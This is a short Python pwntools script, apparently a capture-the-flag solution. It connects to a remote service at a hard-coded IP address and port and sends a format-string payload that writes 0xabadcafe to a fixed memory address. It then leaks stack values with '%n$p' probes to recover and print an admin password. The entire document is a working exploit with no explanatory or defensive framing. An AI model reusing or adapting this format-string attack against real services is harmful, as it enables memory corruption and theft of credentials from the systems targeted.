import pwn
import time

i = 6
l = []
while(i != 30):
	r = pwn.remote('185.235.41.205', 7040)
	r.recvlines(11)
	r.sendline('A')
	r.recvline()
	w = {0x0804c03c:0xabadcafe}
	pay = pwn.fmtstr_payload(15, w)
	r.sendline(pay)
	r.recvline()
	r.recvline()	
	p = "%" + str(i) + "$p"
	r.sendline(p)
	adminPass = r.recvlines(3)[2].split(" ")[-1]
	l.append(adminPass)
	try:
		print(pwn.p32(int(adminPass, 16)))
	except:
		pass
	i = i + 1

pl = []
for k in l[6:21]:
	try:
		pl.append(pwn.p32(int(k, 16)))
	except Exception as e:
		pass
	
print("".join(pl))